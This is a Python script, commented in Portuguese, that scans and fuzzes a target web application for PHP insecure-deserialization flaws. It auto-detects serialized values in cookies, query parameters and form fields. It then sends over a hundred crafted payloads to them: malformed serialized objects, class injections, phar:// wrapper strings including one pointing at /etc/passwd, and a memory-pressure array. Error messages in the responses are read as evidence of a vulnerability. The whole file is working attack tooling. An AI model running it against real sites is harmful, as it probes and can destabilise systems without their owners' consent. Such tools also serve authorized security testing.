import requests
import base64
import time
import sys
import re
from urllib.parse import urlparse, parse_qs

# ==============================================================================
# BIBLIOTECA COMPLETA DE 100+ PAYLOADS PARA FINGERPRINTING (PHP)
# ==============================================================================
PAYLOADS = {
    "SYNTAX_ERRORS": [
        "a:1:{", "O:8:\"Exploit\":0:", "s:5:\"abc\";", "i:123", "b:2;", "d:12.34", "N", 
        "a:1:{s:1:\"a\";i:1", "O:1:\"A\":1:{s:1:\"b\";s:1:\"c\"}", "s:0:\"\";", "s:-1:\"\";",
        "O:999:\"A\":0:{}", "a:2:{s:1:\"1\";s:1:\"2\";}", "r:1;", "R:1;", "C:8:\"MyClass\":0:{}",
        "a:1:{i:0;s:1:\"a\"}", "O:4:\"User\":2:{s:8:\"username\";s:5:\"admin\";}",
        "i:0", "b:x;", "d:NaN;", "d:INF;", "a:1:{s:1:\"a\";i:1;s:1:\"b\";i:2;}",
        "O:10:\"Test\":1:{s:1:\"a\";s:1:\"b\"}", "a:1:{s:1:\"a\";s:1:\"b\";",
        "a:1:{i:0;s:1:\"a\";", "s:2:\"a\";", "s:10:\"abc\";", "i:99999999999999999;"
    ],
    "CLASS_INJECTIONS": [
        "O:14:\"NonExistentXYZ\":0:{}", "O:11:\"PHP_Exploit\":0:{}", "O:13:\"StandardClass\":0:{}",
        "O:16:\"\\App\\Models\\User\":0:{}", "O:8:\"Database\":0:{}", "O:10:\"Connection\":0:{}",
        "O:7:\"Session\":0:{}", "O:4:\"Auth\":0:{}", "O:5:\"Admin\":0:{}", "O:9:\"Container\":0:{}",
        "O:8:\"Exception\":2:{s:7:\"message\";s:5:\"VULN\";s:4:\"code\";i:1;}",
        "O:5:\"Error\":2:{s:7:\"message\";s:5:\"VULN\";s:4:\"code\";i:1;}",
        "O:11:\"SplPriorityQueue\":0:{}", "O:10:\"SplStack\":0:{}", "O:12:\"ArrayIterator\":0:{}",
        "O:10:\"SplObjectStorage\":0:{}", "O:11:\"ArrayObject\":0:{}", "O:8:\"stdClass\":0:{}",
        "O:13:\"SimpleXMLElement\":0:{}", "O:6:\"Logger\":0:{}", "O:6:\"Helper\":0:{}",
        "O:12:\"System_Audit\":0:{}", "O:11:\"Object_Base\":0:{}", "O:15:\"SecurityManager\":0:{}",
        "O:9:\"App\\Core\":0:{}", "O:10:\"Controller\":0:{}", "O:5:\"Model\":0:{}",
        "O:4:\"View\":0:{}", "O:7:\"Service\":0:{}", "O:6:\"Config\":0:{}", "O:5:\"Cache\":0:{}"
    ],
    "PHAR_WRAPPERS": [
        "phar://test.phar", "phar://test.jpg", "phar://test.png/test.txt", 
        "compress.zlib://phar://test.phar", "php://filter/resource=phar://test.phar",
        "phar:///etc/passwd", "phar://./test.phar", "glob://phar://*.phar",
        "phar://network-share/test.phar", "phar://test.phar/", "phar://test.phar/.",
        "PHAR://test.phar", "pHaR://test.phar", "phar://\\test.phar", "phar:test.phar",
        "zip://test.zip#test.phar", "phar://data:text/plain;base64,PD9waHAgX19IQUxUX0NPTVBJTEVSKCk7ID8+"
    ],
    "ADVANCED_FUZZING": [
        "a:100000:{i:0;i:1;}", # Memory Pressure
        "O:4:\"User\":1:{S:11:\"\\00User\\00name\";s:5:\"admin\";}", # Private
        "O:4:\"User\":1:{S:3:\"\\00*\\00name\";s:5:\"admin\";}", # Protected
        "O:4:\"User\":1:{s:8:\"username\";r:1;}", # Ref
        "O:4:\"User\":1:{s:8:\"username\";R:1;}", # Global Ref
        "S:5:\"\\x61\\x62\\x63\\x64\\x65\";", # Hex Escape
        "a:2:{i:0;s:1:\"a\";i:0;s:1:\"b\";}", # Duplicate Key
        "O:8:\"stdClass\":1:{s:0:\"\";s:1:\"a\";}", # Empty prop
        "O:8:\"stdClass\":1:{s:1:\"\n\";s:1:\"a\";}", # Newline prop
        "O:8:\"stdClass\":1:{s:1:\"\0\";s:1:\"a\";}", # Null prop
        "a:1:{i:0;O:8:\"stdClass\":0:{}}", # Object in Array
        "O:4:\"User\":1:{s:1:\"a\";C:11:\"ArrayObject\":21:{x:i:0;a:0:{};m:a:0:{}}}", # Serializable
        "O:4:\"User\":2:{s:1:\"a\";i:1;s:1:\"b\";r:2;}", # Internal Ref
        "a:1:{s:1:\"a\";N;}", # Null value
        "a:1:{s:1:\"a\";b:1;}", # Boolean true
        "a:1:{s:1:\"a\";b:0;}", # Boolean false
        "a:1:{i:2147483647;i:1;}", # Max Int Key
        "a:1:{i:-2147483648;i:1;}", # Min Int Key
        "O:8:\"stdClass\":1:{s:1:\"1\";i:1;}" # Number as string prop
    ]
}

# Assinaturas de serialização PHP (Puro e Base64)
SERIAL_SIGS = [
    r'^O:\d+:"', r'^a:\d+:{', r'^s:\d+:"', r'^i:\d+;', r'^b:[01];', r'^d:\d+\.\d+;', 
    r'^Tzo', r'^YTo', r'^czo', r'^aTo', r'^Yjo', r'^ZDo'
]

# ==============================================================================
# FUNÇÕES DE APOIO
# ==============================================================================
def smart_discovery(url):
    print(f"[*] Iniciando Smart Discovery em: {url}")
    found_targets = []
    try:
        r = requests.get(url, timeout=10)
        for name, value in r.cookies.items():
            for sig in SERIAL_SIGS:
                if re.match(sig, value):
                    print(f"[+] Alvo Detectado em Cookie: {name}")
                    found_targets.append((name, 'cookie'))
                    break
        parsed = urlparse(url)
        params = parse_qs(parsed.query)
        for p in params:
            for val in params[p]:
                for sig in SERIAL_SIGS:
                    if re.match(sig, val):
                        print(f"[+] Alvo Detectado em GET: {p}")
                        found_targets.append((p, 'get'))
                        break
        inputs = re.findall(r'name=["\'](.*?)["\'].*?value=["\'](.*?)["\']', r.text)
        for name, value in inputs:
            for sig in SERIAL_SIGS:
                if re.match(sig, value):
                    print(f"[+] Alvo Detectado em POST: {name}")
                    found_targets.append((name, 'post'))
                    break
    except Exception as e: print(f"[X] Erro no Discovery: {e}")
    return list(set(found_targets))

def analyze(response, p_name, p_val, elapsed):
    fingerprints = ["unserialize():", "Error at offset", "Class not found", "__destruct()", "__wakeup()", "internal corruption in phar"]
    found = [fp for fp in fingerprints if fp.lower() in response.text.lower()]
    if found or response.status_code == 500:
        print(f"\n[!] VULNERABILIDADE DETECTADA!")
        print(f"    - Tática: {p_name} | Pistas: {', '.join(found) if found else 'Erro 500'}")
        return True
    return False

def run_fuzzer(url, param, method):
    print(f"\n[+] Fuzzing Intensivo: {param} ({method.upper()})")
    count = 0
    for cat, list_p in PAYLOADS.items():
        for p in list_p:
            count += 1
            variants = [p, base64.b64encode(p.encode()).decode()]
            for v in variants:
                try:
                    if method == "get": r = requests.get(url, params={param: v}, timeout=5)
                    elif method == "post": r = requests.post(url, data={param: v}, timeout=5)
                    elif method == "cookie": r = requests.get(url, cookies={param: v}, timeout=5)
                    analyze(r, cat, v, 0)
                    if count % 10 == 0: print(f"[*] Progresso: {count} payloads testados...", end="\r")
                except: pass
    print(f"\n[*] Finalizado para {param}.")

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("\nUSO: python scanner.py <URL> [PARAM] [METHOD]")
        sys.exit(1)
    target_url = sys.argv[1]
    if len(sys.argv) == 2:
        targets = smart_discovery(target_url)
        for p, m in targets: run_fuzzer(target_url, p, m)
    else:
        run_fuzzer(target_url, sys.argv[2], sys.argv[3].lower())
